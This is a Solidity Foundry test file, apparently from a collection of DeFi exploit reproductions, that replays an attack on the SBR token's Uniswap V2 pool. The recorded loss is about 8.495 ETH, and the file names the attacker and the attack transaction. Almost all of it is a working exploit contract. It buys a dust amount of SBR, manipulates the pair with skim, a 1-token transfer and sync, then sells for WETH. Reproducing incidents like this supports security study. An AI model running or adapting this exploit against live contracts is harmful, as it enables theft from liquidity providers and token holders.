// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 8.495 ETH
// Attacker : https://etherscan.io/address/0x7a6488348a7626c10e35df9ae0a2ad916a56a952
// Attack Contract : https://etherscan.io/address/0x9926796371e0107abe406128fa801fda0e436f44
// Vulnerable Contract :
// Attack Tx : https://etherscan.io/tx/0xe4c1aeacf8c93f8e39fe78420ce7a114ecf59dea90047cd2af390b30af54e7b9

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1897826817429442652

address constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
address constant wETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV2Pair = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;

contract SBRToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 21_991_722 - 1);
        vm.deal(attacker, 1 ether);

        vm.label(attacker, "Exploiter");
        vm.label(SBR, "SBR Token");
        vm.label(wETH, "Wrapped Ether");
        vm.label(UniswapV2Router, "Uniswap V2: Router 2");
        vm.label(UniswapV2Pair, "Uniswap V2: Pair");
    }

    function testExploit() public {
        emit log_named_decimal_uint("ETH before attack", attacker.balance, 18);

        vm.prank(attacker);
        AttackerC attC = new AttackerC{value: 0.000000000000004 ether}();
        attC.attack();
        vm.stopPrank();

        emit log_named_decimal_uint("ETH after attack", attacker.balance, 18);
    }
}

contract AttackerC {
    address attacker;

    constructor() payable {
        attacker = msg.sender;
    }

    function attack() public {
        address[] memory path = new address[](2);
        path[0] = wETH;
        path[1] = SBR;
        IRouter(UniswapV2Router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.000000000000004 ether}(
            0, path, address(this), block.timestamp + 100
        );

        Uni_Pair_V2(UniswapV2Pair).skim(UniswapV2Pair);

        IERC20(SBR).transfer(UniswapV2Pair, 1);

        Uni_Pair_V2(UniswapV2Pair).sync();

        IERC20(SBR).approve(UniswapV2Router, type(uint256).max);

        uint256 balance = IERC20(SBR).balanceOf(address(this));
        // console.log(balance); // 54804369677
        path[0] = SBR;
        path[1] = wETH;
        IRouter(UniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance, 0, path, attacker, block.timestamp + 100
        );
    }
}
